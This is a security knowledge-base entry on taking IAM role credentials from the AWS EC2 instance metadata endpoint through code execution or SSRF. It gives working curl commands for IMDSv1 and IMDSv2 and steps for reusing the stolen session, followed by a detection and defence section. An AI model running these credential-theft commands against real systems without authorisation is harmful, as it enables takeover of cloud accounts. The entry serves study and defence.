---
title: EC2 instance metadata
slug: aws-instance-metadata
---

> **TL;DR:** `169.254.169.254` hands back IAM role credentials to whoever can reach it from the instance — IMDSv1 lets a single GET do it, IMDSv2 demands a PUT-issued token but is still trivially abused once you have code execution.

## What it is
The Instance Metadata Service (IMDS) is a link-local HTTP endpoint reachable only from inside an EC2 instance. It exposes instance configuration plus, critically, temporary STS credentials for the IAM role attached to the instance. IMDSv1 is a plain GET, which makes any SSRF on the box a credential leak. IMDSv2 adds a session-token requirement (a PUT to `/latest/api/token` returns a short-lived token used in the `X-aws-ec2-metadata-token` header) and a default hop-limit of 1, which kills many SSRF flavours but does nothing once you have a shell.

## Preconditions / where it applies
- Code execution on, or unrestricted SSRF from, an EC2 instance, ECS task with task metadata enabled, or EKS node.
- Instance has an IAM instance profile attached (otherwise the endpoint returns 404 on `/iam/security-credentials/`).
- For SSRF against IMDSv2: target SSRF primitive must be able to issue a `PUT` with an arbitrary header *or* the instance is still on v1.

## Technique
1. Confirm metadata reachability and IMDS version.
2. Pull the role name, then the credentials.
3. Export and use as a normal session for `aws` CLI.

```bash
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

```bash
# IMDSv2 (token-based)
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash
# Use the creds
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

For SSRF gadgets: parsers that follow redirects but only emit `GET` cannot mint a v2 token; chains that allow arbitrary headers + method (e.g. SSRF via a webhook configurator) can. Container workloads use `169.254.170.2` plus `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

## Detection and defence
- Force IMDSv2 with `HttpTokens=required` and set `HttpPutResponseHopLimit=1` so containers cannot reach it.
- Use VPC endpoint policies and SCPs to deny `sts:GetCallerIdentity` from outside your VPC CIDR for the role.
- GuardDuty `UnauthorizedAccess:EC2/MetadataDNSRebind` and `InstanceCredentialExfiltration*` flag credential reuse from a different IP.
- Related: [[aws-iam-enum]], [[ssrf]].

## References
- [HackingTheCloud — EC2 metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) — concrete SSRF payloads against both IMDS versions.
- [AWS — Configuring IMDS options](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-options.html) — vendor guidance on enforcing v2 and hop-limit.
